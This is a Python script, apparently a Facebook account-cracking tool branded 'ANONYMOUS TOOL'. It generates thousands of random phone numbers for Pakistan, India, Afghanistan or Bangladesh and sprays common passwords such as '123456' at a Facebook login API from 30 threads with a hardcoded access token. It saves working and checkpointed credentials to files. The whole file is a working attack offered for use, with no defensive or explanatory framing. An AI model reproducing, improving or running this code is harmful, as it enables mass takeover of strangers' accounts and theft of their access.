#----------------------------[IMPORTS]----------------------------#
import requests, json, os, sys, time, random, datetime, re, uuid
import urllib3
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from time import localtime as lt
from rich import print as rprint
from rich.panel import Panel
from rich.console import Console
import socket

#----------------------------[COLOR SETTINGS]----------------------------#
console = Console()
A = '\x1b[1;97m'
G = '\x1b[38;5;46m'
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
B = '\x1b[38;5;8m'

#----------------------------[TOOL INFO]----------------------------#
def tool_info():
    os.system("clear")
    ip = requests.get("https://api64.ipify.org?format=json").json()["ip"]
    time_now = datetime.datetime.now().strftime("%H:%M:%S")
    panel_text = f"""
    [bold green]TOOL OWNER:[/] [cyan]Abd Ur Rab[/]
    [bold green]STATUS:[/] [cyan]ACTIVE[/]
    [bold green]VERSION:[/] [cyan]1.0[/]
    [bold green]TIME:[/] [cyan]{time_now}[/]
    [bold green]IP ADDRESS:[/] [cyan]{ip}[/]
    """
    rprint(Panel(panel_text, title="[bold red]ANONYMOUS TOOL[/]", subtitle="We Are Legion", style="bold magenta"))

#----------------------------[USER AGENT GENERATOR]----------------------------#
def generate_ua():
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(99, 125)}.0.{random.randint(4500, 4999)}.{random.randint(75, 99)} Safari/537.36"

#----------------------------[NUMBER GENERATOR]----------------------------#
def generate_numbers(country):
    prefix = {
        "1": "9230",   # Pakistan
        "2": "9198",   # India
        "3": "9370",   # Afghanistan
        "4": "8801"    # Bangladesh
    }
    numbers = []
    for _ in range(10000):
        numbers.append(prefix[country] + str(random.randint(1000000, 9999999)))
    return numbers

#----------------------------[LOGIN FUNCTION]----------------------------#
def login(uid, pw):
    session = requests.Session()
    try:
        headers = {
            "user-agent": generate_ua(),
            "content-type": "application/x-www-form-urlencoded"
        }
        url = f"https://b-api.facebook.com/method/auth.login?format=json&email={uid}&password={pw}&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
        response = session.get(url, headers=headers).json()
        
        if "session_key" in response:
            rprint(f"[bold green]SUCCESS:[/] {uid} | {pw}")
            open("success.txt", "a").write(f"{uid}|{pw}\n")
        elif "www.facebook.com" in response.get("error_msg", ""):
            rprint(f"[bold yellow]CHECKPOINT:[/] {uid} | {pw}")
            open("checkpoint.txt", "a").write(f"{uid}|{pw}\n")
    except Exception as e:
        pass

#----------------------------[MAIN FUNCTION]----------------------------#
def main():
    tool_info()
    
    print("\n[1] Pakistan")
    print("[2] India")
    print("[3] Afghanistan")
    print("[4] Bangladesh")
    country = input("\n[?] Choose Your Country: ")
    
    if country not in ["1", "2", "3", "4"]:
        print("\n[!] Invalid Choice! Exiting...")
        sys.exit()
    
    passwords = ["123456", "12345678", "password", "000000", "pakistan123"]
    numbers = generate_numbers(country)
    
    with ThreadPool(max_workers=30) as executor:
        for num in numbers:
            for pw in passwords:
                executor.submit(login, num, pw)

if __name__ == "__main__":
    main()